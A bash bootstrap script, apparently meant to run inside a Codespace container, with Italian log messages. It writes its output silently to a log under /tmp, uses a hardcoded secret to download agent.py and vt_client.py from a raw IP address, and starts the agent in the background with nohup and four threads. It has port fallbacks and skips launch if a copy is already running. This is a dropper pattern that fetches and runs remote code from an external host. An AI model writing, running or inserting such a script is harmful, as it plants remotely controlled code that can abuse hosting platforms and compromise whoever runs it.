#!/usr/bin/env bash
# Robust bootstrap script for autonomous agent inside Codespace container

AGENT_DIR="/tmp/codespace-agent"
mkdir -p "${AGENT_DIR}"
LOG_FILE="${AGENT_DIR}/setup.log"

exec >> "${LOG_FILE}" 2>&1
echo "=== Bootstrap Agente Codespace $(date) ==="

AGENT_SECRET="${AGENT_SECRET:-codespace-secret-key-2026}"
AGENT_ID="cs-${CODESPACE_NAME:-$(hostname)}"

# Determine working server URL: try port 9000, fallback to port 80
TARGET_SERVER="${SERVER_URL:-http://92.5.62.91:9000}"
if ! curl -s -f --connect-timeout 4 "${TARGET_SERVER}/api/status" > /dev/null 2>&1; then
  echo "Target ${TARGET_SERVER} non raggiungibile direttamente. Test fallback su porta 80..."
  FALLBACK_SERVER="http://92.5.62.91"
  if curl -s -f --connect-timeout 4 "${FALLBACK_SERVER}/api/status" > /dev/null 2>&1; then
    TARGET_SERVER="${FALLBACK_SERVER}"
    echo "Fallback attivo su ${TARGET_SERVER}."
  fi
fi

echo "Utilizzo server: ${TARGET_SERVER}"

# Download agent.py
if ! curl -s -f --connect-timeout 10 -H "X-Agent-Secret: ${AGENT_SECRET}" \
  "${TARGET_SERVER}/api/agent/download" -o "${AGENT_DIR}/agent.py"; then
  echo "Download agent.py fallito con target ${TARGET_SERVER}."
  TARGET_SERVER="http://92.5.62.91"
  curl -s -f --connect-timeout 10 -H "X-Agent-Secret: ${AGENT_SECRET}" \
    "${TARGET_SERVER}/api/agent/download" -o "${AGENT_DIR}/agent.py" || true
fi

# Download vt_client.py
curl -s -f --connect-timeout 10 -H "X-Agent-Secret: ${AGENT_SECRET}" \
  "${TARGET_SERVER}/api/agent/download-vt-client" -o "${AGENT_DIR}/vt_client.py" || true

if [[ ! -f "${AGENT_DIR}/agent.py" ]]; then
  echo "ERRORE: Impossibile scaricare agent.py!"
  exit 1
fi

chmod +x "${AGENT_DIR}/agent.py"

# Check if agent is already running to avoid duplicates
if pgrep -f "agent\.py" > /dev/null 2>&1; then
  echo "Agente già in esecuzione con PID $(pgrep -f 'agent\.py')."
  exit 0
fi

echo "Avvio agente autonomo in background (ID: ${AGENT_ID})..."
nohup python3 "${AGENT_DIR}/agent.py" \
  --server "${TARGET_SERVER}" \
  --secret "${AGENT_SECRET}" \
  --agent-id "${AGENT_ID}" \
  --threads 4 \
  > "${AGENT_DIR}/agent.log" 2>&1 &

echo "Agente avviato con PID $! su ${TARGET_SERVER}."
